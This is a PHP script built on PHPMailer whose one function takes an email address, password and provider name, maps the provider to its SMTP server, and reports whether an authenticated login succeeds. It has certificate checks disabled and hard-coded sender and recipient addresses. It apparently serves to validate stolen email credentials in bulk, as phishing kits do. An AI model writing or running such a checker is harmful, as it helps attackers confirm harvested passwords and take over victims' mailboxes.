<?php

require 'PHPMailerAutoload.php';

function check($email,$password,$provider){
	
	$split = explode('#', $provider);
	$domnom = $split[1];
	$domsrv = $split[0];
	
switch ($domsrv) {
    case "office":
        $port = 587;
		$smtp = 'smtp.office365.com';
        break;
    case "godaddy":
        $port = 80;
		$smtp = 'smtpout.secureserver.net';
        break;
    case "1and1":
        $port = 587;
		$smtp = 'smtp.ionos.com';
        break;
    case "sendone":
        $port = 587;
		$smtp = 'send.one.com';
        break;
    case "mailhostbox":
        $port = 587;
		$smtp = 'us2.smtp.mailhostbox.com';
        break;
    case "rackspace":
        $port = 587;
		$smtp = 'secure.emailsrvr.com';
        break;
    case "roadrunner":
        $port = 587;
		$smtp = 'mail.twc.com';
        break;
    case "proximus":
        $port = 587;
		$smtp = 'relay.proximus.be';
        break;
    case "gandi":
        $port = 587;
		$smtp = 'mail.gandi.net';
        break;
    case "mail.com":
        $port = 587;
		$smtp = 'smtp.mail.com';
        break;
	case "Netease":
        $port = 587;
		$smtp = 'smtp.qiye.163.com';
        break;
	case "263":
        $port = 587;
		$smtp = 'smtp.263.net';
        break;
	case "QQ":
        $port = 587;
		$smtp = 'smtp.exmail.qq.com';
        break;
	case "Strato":
        $port = 587;
		$smtp = 'smtp.strato.de';
        break;
	case "netsolmail":
        $port = 25;
		$smtp = 'smtp.'.$domnom;
        break;
	case "ovh":
        $port = 587;
		$smtp = 'ex2.mail.ovh.net';
        break;
	/*case "west.exch021.serverdata.net":
        $port = 587;
		$smtp = 'west.exch021.serverdata.net';
        break;
	case "west.exch022.serverdata.net":
        $port = 587;
		$smtp = 'west.exch022.serverdata.net';
        break;
	case "west.exch023.serverdata.net":
        $port = 587;
		$smtp = 'west.exch023.serverdata.net';
        break;
	case "west.exch025.serverdata.net":
        $port = 587;
		$smtp = 'west.exch025.serverdata.net';
        break;
	case "west.exch026.serverdata.net":
        $port = 587;
		$smtp = 'west.exch026.serverdata.net';
        break;
	case "west.exch027.serverdata.net":
        $port = 587;
		$smtp = 'west.exch027.serverdata.net';
        break;
	case "west.exch028.serverdata.net":
        $port = 587;
		$smtp = 'west.exch028.serverdata.net';
        break;
	case "west.exch029.serverdata.net":
        $port = 587;
		$smtp = 'west.exch029.serverdata.net';
        break;
	case "west.exch030.serverdata.net":
        $port = 587;
		$smtp = 'west.exch030.serverdata.net';
        break;
	case "west.exch031.serverdata.net":
        $port = 587;
		$smtp = 'west.exch031.serverdata.net';
        break;
	case "west.exch032.serverdata.net":
        $port = 587;
		$smtp = 'west.exch032.serverdata.net';
        break;
	case "west.exch080.serverdata.net":
        $port = 587;
		$smtp = 'west.exch080.serverdata.net';
        break;
	case "west.exch081.serverdata.net":
        $port = 587;
		$smtp = 'west.exch081.serverdata.net';
        break;
	case "west.exch082.serverdata.net":
        $port = 587;
		$smtp = 'west.exch082.serverdata.net';
        break;
	case "west.exch083.serverdata.net":
        $port = 587;
		$smtp = 'west.exch083.serverdata.net';
        break;
	case "west.exch084.serverdata.net":
        $port = 587;
		$smtp = 'west.exch084.serverdata.net';
        break;
	case "west.exch090.serverdata.net":
        $port = 587;
		$smtp = 'west.exch090.serverdata.net';
        break;
	case "west.exch091.serverdata.net":
        $port = 587;
		$smtp = 'west.exch091.serverdata.net';
        break;
	case "west.exch092.serverdata.net":
        $port = 587;
		$smtp = 'west.exch092.serverdata.net';
        break;
	case "west.exch480.serverdata.net":
        $port = 587;
		$smtp = 'west.exch480.serverdata.net';
        break;
	case "exch580.serverdata.net":
        $port = 587;
		$smtp = 'exch580.serverdata.net';
        break;*/
    /*case "t-online":
        $port = 587;
		$smtp = 'securesmtp.t-online.de';
        break;*/
	}
	
	$mail = new PHPMailer;
	$mail->isSMTP();                                      // Set mailer to use SMTP
	$mail->Host = $smtp;  // Specify main and backup SMTP servers
	$mail->Port = $port;                                    // TCP port to connect to
	$mail->SMTPAuth = true;                               // Enable SMTP authentication
	$mail->Username = $email;                 // SMTP username
	$mail->Password = $password;                           // SMTP password
	$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
	$mail->setFrom('hbergamini@truehomesusa.com', 'Mailer');
	$mail->addAddress('bestfrndx@gmail.com');               // Name is optional
	$mail->addReplyTo('info@example.com', 'Information');
	$mail->SMTPOptions 	= array(
							'ssl' => array(
								'verify_peer' => false,
								'verify_peer_name' => false,
								'allow_self_signed' => true
							)
						);

	$mail->isHTML(true);                                  // Set email format to HTML

	$mail->Subject = 'Here is the subject';
	$mail->Body    = 'This is the HTML message body <b>in bold!</b>';
	$mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
	if($mail->smtpConnect()){
    		$mail->smtpClose();
		return 1;
	}else{
    		return 0;
	}
}
